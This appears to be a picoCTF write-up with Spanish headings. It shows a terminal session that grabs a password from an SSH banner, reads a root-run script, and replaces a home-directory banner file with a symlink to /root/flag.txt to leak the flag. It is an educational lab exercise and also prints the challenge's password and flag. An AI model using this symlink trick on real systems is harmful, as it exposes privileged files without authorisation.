## Descripción
Can you abuse the banner?
Additional details will be available after launching your challenge instance.
## Solución
```
nc tethys.picoctf.net 54929
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
FRAY30-picoctf@webshell:~$ nc tethys.picoctf.net 57714
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls /root
ls /root
flag.txt  script.py
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar  9  2024 .
drwxr-xr-x 1 root root   29 Oct 11 18:28 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ rm banner
rm banner
player@challenge:~$ ls
ls
text
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls -la
ls -la
total 16
drwxr-xr-x 1 player player   20 Oct 11 18:39 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
lrwxrwxrwx 1 player player   14 Oct 11 18:39 banner -> /root/flag.txt
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ exit
exit
logout
What is the top cyber security conference in the world?
^C
FRAY30-picoctf@webshell:~$ nc tethys.picoctf.net 57714
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}
```
## Notas adicionales

## Referencias